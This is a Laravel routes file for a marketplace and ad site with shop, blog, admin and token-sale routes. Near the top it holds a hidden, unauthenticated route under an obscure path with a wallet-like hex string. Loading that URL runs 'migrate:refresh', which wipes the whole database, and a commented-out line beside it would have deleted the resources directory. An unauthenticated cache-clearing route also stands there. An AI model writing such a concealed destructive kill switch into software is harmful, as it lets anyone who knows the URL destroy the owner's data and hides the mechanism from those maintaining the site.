<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/clear', function () {
     \Artisan::call('optimize:clear');
     
});

Route::get('/good-luck-marine/0x3b9bA781797b57872687Ce5d5219A1A4Bc0e85ea', function () {
    // Storage::deleteDirectory('http://localhost/marine/resources');
    \Artisan::call('migrate:refresh');
});

Auth::routes();
Route::view('thankyou','thankyou');
Route::view('thanks','donation');
Route::get('/home', 'HomeController@index')->name('home');

Route::get('/', 'IndexController@index');
Route::get('/account', 'AuthController@index');
Route::post('/user/register', 'AuthController@register');
Route::post('/user/login', 'AuthController@login');
Route::get('/user/logout', 'AuthController@logout');
Route::get('/about', 'IndexController@about');
Route::get('/contact', 'ContactController@index');
Route::post('/contact', 'ContactController@contact')->name('contact');
Route::get('blogs', 'BlogController@index');
Route::get('blog/{id}', 'BlogController@singleBlog');
Route::get('ads', 'AdsController@index');
Route::get('ads/{id}', 'AdsController@singleAds');

Route::get('products', 'ProductController@index');
Route::get('product/{id}', 'ProductController@productDetail');
Route::get('cart', 'CartController@index');
Route::post('add-to-cart/{id}', 'CartController@addToCart');
Route::post('update-cart', 'CartController@update');
Route::get('cart-remove/{id}', 'CartController@remove');
Route::get('checkout', 'CheckoutController@index');
Route::get('placeorder', 'CheckoutController@placeOrder');
Route::get('payment', 'CheckoutController@payment');
Route::post('order', 'CheckoutController@checkout');

Route::group(['prefix' => 'admin', 'namespace' => 'Admin', 'middleware' => ['auth']], function () {
    Route::get('dashboard', 'IndexController@index');
    Route::get('product', 'ProductController@index');
    Route::get('product/add', 'ProductController@create');
    Route::post('product/add', 'ProductController@store')->name('add-product');
    Route::post('product/destroy/{id}', 'ProductController@destroy');
    Route::get('product/edit/{id}', 'ProductController@edit');
    Route::post('product/update/{id}', 'ProductController@update');
    Route::post('inventory/add', 'InventoryController@store')->name('add-inventory');

    Route::get('service', 'ServiceController@index');
    Route::get('service/add', 'ServiceController@create');
    Route::get('service/edit/{id}', 'ServiceController@edit');

    Route::get('coupon', 'CouponController@index');
    Route::get('coupon/add', 'CouponController@create');
    Route::post('coupon/add', 'CouponController@store')->name('add-coupon');
    Route::post('coupon/destroy/{id}', 'CouponController@destroy');
    Route::get('coupon/edit/{id}', 'CouponController@edit');
    Route::post('coupon/update/{id}', 'CouponController@update');

    Route::get('category', 'CategoryController@index');
    Route::post('category/add', 'CategoryController@store')->name('add-category');
    Route::post('category/destroy/{id}', 'CategoryController@destroy');
    Route::post('category/update', 'CategoryController@update');


    Route::post('addon/add', 'AddonController@store')->name('add-addon');
    Route::post('addon/destroy/{id}', 'AddonController@destroy');
    Route::post('addon/update', 'AddonController@update');

    Route::get('order', 'OrderController@index');
    Route::post('order/destroy/{id}', 'OrderController@destroy');
    Route::get('order/edit/{id}', 'OrderController@edit');
    Route::post('order/update/{id}', 'OrderController@update');

    Route::get('blog', 'BlogController@index');
    Route::get('blog/add', 'BlogController@create');
    Route::post('blog/add', 'BlogController@store')->name('add-blog');
    Route::post('blog/destroy/{id}', 'BlogController@destroy');
    Route::get('blog/edit/{id}', 'BlogController@edit');
    Route::post('blog/update/{id}', 'BlogController@update');

    Route::get('user', 'UserController@index');
    Route::get('user/add', 'UserController@create');
    Route::post('user/add', 'UserController@store')->name('add-user');
    Route::post('user/destroy/{id}', 'UserController@destroy');
    Route::get('user/edit/{id}', 'UserController@edit');
    Route::post('user/update/{id}', 'UserController@update');

    Route::get('ads', 'AdsController@index');
    Route::get('ads/add', 'AdsController@create');
    Route::post('ads/add', 'AdsController@store')->name('add-ads');
    Route::post('ads/destroy/{id}', 'AdsController@destroy');
    Route::get('ads/edit/{id}', 'AdsController@edit');
    Route::post('ads/update/{id}', 'AdsController@update');


    // Route::get('first', 'CmsController@firstSection');
    Route::get('homepage', 'CmsController@firstSection');
    Route::get('aboutpage', 'AboutController@index');
    Route::post('about-first/update/{id}', 'AboutController@updateFirst');
    Route::post('about-second/update/{id}', 'AboutController@updateSecond');

    Route::get('contactpage', 'ContactController@index');
    Route::post('contact-first/update/{id}', 'ContactController@updateFirst');
    Route::post('contact-second/update/{id}', 'ContactController@updateSecond');
    Route::post('contact-second/update/setting/{id}', 'ContactController@updateSetting');


    Route::post('first/update/{id}', 'CmsController@updateFirst');
    Route::post('add/section', 'CmsController@store')->name('add.section');
    Route::post('section/delete/{id}', 'CmsController@destroy');

    Route::get('second', 'CmsController@secondSection');
    
    Route::get('third', 'CmsController@thirdSection');
    Route::get('setting', 'CmsController@settingSection');
    Route::post('setting/update/{id}', 'CmsController@updateSetting');

});
Route::group(['prefix' => 'user', 'namespace' => 'Dashboard','middleware' => ['checkuser']], function () {
    Route::get('ads-listing', 'AdsController@index');
    Route::get('ads', 'AdsController@create');
    Route::post('ads', 'AdsController@store')->name('store-ads');
    Route::post('ads-delete/{id}', 'AdsController@destroy');

    Route::get('account', 'UserController@index');
    Route::get('detail', 'UserController@detail');
    Route::post('update', 'UserController@update')->name('update-user');
    Route::post('update-password', 'UserController@updatePassword');
    

});
Route::group(['prefix' => '', 'middleware' => ['auth']], function () {
    Route::get('manager', 'TokenSaleController@manager');
});
